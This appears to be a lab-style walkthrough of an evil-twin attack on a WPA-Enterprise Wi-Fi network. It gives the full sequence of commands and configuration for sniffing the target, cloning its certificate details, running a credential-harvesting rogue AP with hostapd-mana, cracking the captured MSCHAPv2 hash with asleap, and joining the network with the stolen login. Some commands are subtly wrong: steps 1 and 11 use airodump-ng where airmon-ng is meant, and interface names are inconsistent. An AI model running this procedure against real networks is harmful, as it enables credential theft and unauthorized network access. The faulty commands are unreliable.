1. Place interface in monitor mode with Airmon-Ng.
# airodump-ng start wlanX

2. Start monitoring traffic with Airodump-Ng.
# airodump-ng wlanXmon

3. Focus monitoring of traffic on the router with BSSID 02:13:37:BE:EF:03 on channel X.
# airodump-ng --bssid 02:13:37:BE:EF:03 -c 11 --write wpa-mgt_passwordcrack wlan0mon

4. After collecting enough packets, use Wireshark to open the .cap “wpa-mgt_passwordcrack-01.cap” file generated from step 3. 
# wireshark wpa-mgt_passwordcrack-01.cap

5. Use Wireshark to locate the server certificate frame. First, use the BSSID as a display filter to narrow down the AP.  Append eap to the display filter in order to show the full authentications. To quickly narrow down on the certificate in the TLS handshake, append tls.handshake.certificate, which will show the exact frames where the certificate is given.  Below is an example filter to use:
wlan.bssid==02:13:37:BE:EF:03 && eap && tls.handshake.certificate

6. The next step in Wireshark, in the Packet Details pane, open Extensible Authentication Protocol > Transport Layer Security. From there, open the TLSv1 Record Layer: Handshake Protocol: Certificate. Once there, expand the Handshake Protocol: Certificate item, then Certificates. Inside Certificates, you should notice two entries named Certificate. For each certificate, right click and select Export Packet Bytes to save the data into a file with a .der extension. The information in these certificates are then displayed using OpenSSL. 
# openssl x509 -inform der -in cert1.der -outform pem -out cert1_pem.crt
# openssl x509 -inform der -in cert2.der -outform pem -out cert2_pem.crt

7. After viewing the information in the two certificates, modify the necessary information in two files:  /etc/freeradius/3.0/certs/ca.cnf and /etc/freeradius/3.0/certs/server.cnf.  The below information was changed in this example for both files respectively:

# nano /etc/freeradius/3.0/certs/ca.cnf
[certificate_authority]
countryName = US    
stateOrProvinceName = GA       
localityName = Xanth       
organizationName = Noobs      
emailAddress = ca@noobs.localdomain
commonName = "Noob Certificate Authority"

# nano /etc/freeradius/3.0/certs/server.cnf
[server]
countryName = US    
stateOrProvinceName = GA       
localityName = Xanth       
organizationName = Noobs      
emailAddress = ca@noobs.localdomain
commonName = "Noob Certificate Authority" 

8. Next, build the certificates. Delete the /etc/freeradius/3.0/certs/dh file before running the “make” command.
# rm dh && make 

9. Conduct the Rogue AP attack by starting hostapd-mana with a configuration file that was created earlier and named, “/etc/hostapd-mana/mana.conf” as well as the “/etc/hostapd-mana/mana.eap_user” file.
#nano /etc/hostapd-mana/mana.conf

# SSID of the AP
ssid=NoobAP
# Network interface to use and driver type
# We must ensure the interface lists 'AP' in 'Supported interface modes' when running 'iw phy PHYX info'
interface=wlanX
driver=nl80211
# Channel and mode
# Make sure the channel is allowed with 'iw phy PHYX info' ('Frequencies' field - there can be more than one)
channel=1
# Refer to https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf to set up 802.11n/ac/ax
hw_mode=g
# Setting up hostapd as an EAP server
ieee8021x=1
eap_server=1
# Key workaround for Win XP
eapol_key_index_workaround=0
# EAP user file we created earlier
eap_user_file=/etc/hostapd-mana/mana.eap_user
# Certificate paths created earlier
ca_cert=/etc/freeradius/3.0/certs/ca.pem
server_cert=/etc/freeradius/3.0/certs/server.pem
private_key=/etc/freeradius/3.0/certs/server.key
# The password is actually 'whatever'
private_key_passwd=whatever
dh_file=/etc/freeradius/3.0/certs/dh
# Open authentication
auth_algs=1
# WPA/WPA2
wpa=3
# WPA Enterprise
wpa_key_mgmt=WPA-EAP
# Allow CCMP and TKIP
# Note: iOS warns when network has TKIP (or WEP)
wpa_pairwise=CCMP TKIP
# Enable Mana WPE
mana_wpe=1
# Store credentials in that file
mana_credout=/tmp/hostapd.credout
# Send EAP success, so the client thinks it's connected
mana_eapsuccess=1
# EAP TLS MitM
mana_eaptls=1

#nano /etc/hostapd-mana/mana.eap_user

*     PEAP,TTLS,TLS,FAST
"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]

# sudo hostapd-mana /etc/hostapd-mana/mana.conf


10. After a user attempts to authenticate to the Rogue AP, the login attempt for user “Noob\user” should be captured.  Then use the “asleap” command to crack the password hash of “user”.
# asleap -C 41:4e:81:5c:90:e5:84:1a -R 77:cd:9b:ce:2f:07:1d:44:ba:4d:8f:bf:2c:15:c0:69:40:2a:12:1c:02:29:8a:95 -W /usr/share/john/password.lst             

11. Stop monitor mode on the interface with Airmon-Ng.
# airodump-ng stop wlanXmon

12. Use the information from step 10, create a file called wifi-client.conf with the below information:
network={
  ssid="NoobAP"
  scan_ssid=1
  key_mgmt=WPA-EAP
  identity="Noob\user"
  password="password"
  eap=PEAP
  phase1="peaplabel=0"
  phase2="auth=MSCHAPV2"
}

13. Then start wpa_supplicant with the “wifi-client.conf” file to manually connect to the network.
# wpa_supplicant -i wlanX -c wifi-client.conf

14. After successfully connecting to the Access Point, request a DHCP lease using dhclient.
# dhclient wlan0
